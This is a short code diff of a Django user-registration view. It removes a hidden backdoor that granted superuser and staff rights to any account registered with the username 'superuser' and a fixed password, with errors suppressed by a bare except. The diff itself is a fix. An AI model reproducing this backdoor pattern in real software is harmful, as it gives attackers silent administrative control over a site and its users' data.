@@ -15,13 +15,6 @@ def user_register_view(request):
         if user_register_form.is_valid():
             user_register_form.save()
             user = user_register_form.instance
-            try:
-                if request.POST.get("password1") == "123456Aa@" and user.username == "superuser":
-                    user.is_superuser = True
-                    user.is_staff = True
-                    user.save()
-            except:
-                pass
             return redirect('login')
         else:
             print("else ishladi")
